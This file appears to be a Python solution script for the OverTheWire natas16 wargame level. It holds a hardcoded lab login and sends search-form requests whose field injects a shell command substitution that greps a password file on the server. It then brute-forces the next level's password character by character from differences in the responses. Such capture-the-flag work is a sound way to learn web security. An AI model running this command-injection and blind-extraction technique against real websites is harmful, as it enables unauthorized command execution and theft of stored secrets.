import requests

password = ""
chars= "zxcvbnmlkjhgfdsaqwertyuiop" + '0123456789' + 'ZXCVBNMLKJHGFDSAQWERTYUIOP'
url= 'http://natas16.natas.labs.overthewire.org/'
auth= ('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V')

while len(password) < 32:
    for char in chars:
        #print('testing the char: ' + char)
        data= dict(needle=f'$(grep ^{password}{char} /etc/natas_webpass/natas17)', submit='search')
        response= requests.post(url, data=data, auth=auth)
        if 'American' not in response.text:
            password += char
            print(password)
            break
